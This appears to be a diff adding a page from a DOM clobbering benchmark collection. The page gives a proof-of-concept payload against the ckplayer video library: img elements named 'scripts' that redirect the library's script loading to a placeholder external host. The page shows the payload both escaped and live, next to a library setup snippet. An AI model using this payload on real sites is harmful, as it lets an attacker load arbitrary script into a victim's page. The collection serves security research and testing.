@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - ckplayer</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img name=&quot;scripts&quot; src=&quot;https://xxx.xxx.xxx/js/&quot;&gt;
+&lt;img name=&quot;scripts&quot; src=&quot;https://xxx.xxx.xxx/js/&quot;&gt;</pre>
+  <img name="scripts" src="https://xxx.xxx.xxx/js/">
+<img name="scripts" src="https://xxx.xxx.xxx/js/">
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script&gt;
+&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;ckplayer/css/ckplayer.css&quot; /&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;ckplayer/js/ckplayer.js&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;
+&lt;div class=&quot;video&quot; style=&quot;width: 600px;height: 400px;&quot;&gt;播放器容器&lt;/div&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+    var videoObject = {
+        language: &#x27;en&#x27;,
+        container: &#x27;.video&#x27;,
+        video: &#x27;https://fake-server/no.mp4&#x27;
+    };
+    var player = new ckplayer(videoObject);
+&lt;/script&gt;
+&lt;/script&gt;</pre>
+  <script>
+<link type="text/css" rel="stylesheet" href="ckplayer/css/ckplayer.css" />
+<script type="text/javascript" src="ckplayer/js/ckplayer.js" charset="UTF-8"></script>
+<div class="video" style="width: 600px;height: 400px;">播放器容器</div>
+<script type="text/javascript">
+    var videoObject = {
+        language: 'en',
+        container: '.video',
+        video: 'https://fake-server/no.mp4'
+    };
+    var player = new ckplayer(videoObject);
+</script>
+</script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../doomcaptcha/poc.html">Next: doomcaptcha</a>
+  </div>
+</section>
+
+</body>
+</html>
